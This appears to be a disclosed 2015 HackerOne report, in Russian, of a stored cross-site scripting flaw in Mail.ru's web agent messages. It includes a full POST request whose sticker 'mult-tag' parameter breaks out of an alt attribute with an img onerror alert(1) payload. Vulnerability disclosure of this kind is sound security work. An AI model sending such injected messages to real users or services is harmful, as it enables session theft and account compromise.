@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/54719
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/reactors08
+ReportedTo:Mail.ru(mailru)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:28.06.2015 13:29:20
+
+Summary:
+
+Привет :) 
+ смотрим скриншот :)
+XSS в сообщениях агента с помощью стикера (смайла).
+Отправка меседжа со стикером и XSS выглядит так:
+> POST https://jim45.mail.ru/message?session=48280&r=18426&sdc=1 HTTP/1.1
+Accept:	*/*
+Content-Type:	application/x-www-form-urlencoded
+X-Requested-With:	XMLHttpRequest
+Referer:	https://jim45.mail.ru/communicate.html?usedBranch=master&path=u%2Fwebagent%2Frelease%2F460&xdm_e=https%3A%2F%2Fe.mail.ru&xdm_c=default3&xdm_p=1
+Accept-Language:	ru-RU
+Accept-Encoding:	gzip, deflate
+User-Agent:	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Host:	jim45.mail.ru
+Content-Length:	302
+DNT:	1
+Connection:	Keep-Alive
+Cache-Control:	no-cache
+Cookie:	**
+
+to=victim%40mail.ru&message_id=474156&sticker=1&mult-tag=<SMILE>id='ext:205:sticker:4' `alt='"><img src=x onerror=alert(1)>`'</SMILE>&text=%D0%92%D0%B0%D0%BC%20%D0%BF%D1%80%D0%B8%D1%81%D0%BB%D0%B0%D0%BB%D0%B8%20%D1%81%D1%82%D0%B8%D0%BA%D0%B5%D1%80&domain=e.mail.ru&x-email=reactors005%40mail.ru&rnum=bmaster
+
+параметр `message_id`, для отправки сообщения, не нужно изменять так как одно и тоже значение подходит для всех отправляемых сообщений.
+в параметре`mult-tag` мы эксплуатируем атрибут alt.
